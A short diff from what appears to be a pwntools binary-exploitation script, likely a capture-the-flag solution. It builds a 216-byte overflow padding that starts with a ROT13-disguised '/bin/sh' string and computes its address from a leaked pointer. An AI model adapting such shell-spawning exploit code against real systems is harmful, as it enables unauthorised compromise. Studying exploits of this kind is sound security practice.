@@ -205,8 +205,7 @@ sh.sendline(padding)
 '''
 binshp = leak - 0xe0
 binshp = p64(binshp)
-#padding = "/ova/fu\x00".ljust(216,"a")
-#padding = padding.encode()
+
 padding = b'/ova/fu\x00'
 padding = padding+b'a'*(216-len(padding))
 
